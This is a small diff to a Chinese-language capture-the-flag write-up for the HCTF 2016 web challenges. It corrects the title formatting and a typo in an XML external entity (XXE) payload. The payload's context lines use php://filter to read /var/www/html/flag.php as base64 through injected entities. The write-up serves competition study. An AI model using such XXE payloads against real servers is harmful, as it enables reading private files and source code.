@@ -1,6 +1,6 @@
 
 
-#HCTF-2016 WEB WRITES UP PARTLY**
+#HCTF-2016 WEB WRITES UP PARTLY
 
 ###by Hence Zhang@lancet 
 
@@ -464,7 +464,7 @@ exit();
 ><!ENTITY xxe7 SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php">
 >]>
 
-><navLabel><text>&xxe1;||||;&xxe2;||||;&xxe3;||||;&xxe4;||||;&xxe5;||||;&xxe6;||||;&xxe7;||||;</text>></navLabel>
+><navLabel><text>&xxe1;||||;&xxe2;||||;&xxe3;||||;&xxe4;||||;&xxe5;||||;&xxe6;||||;&xxe7;||||;</text></navLabel>
 
 读取到你想要的文件的源码（顺便又把源码脱了一遍*0*）。
 
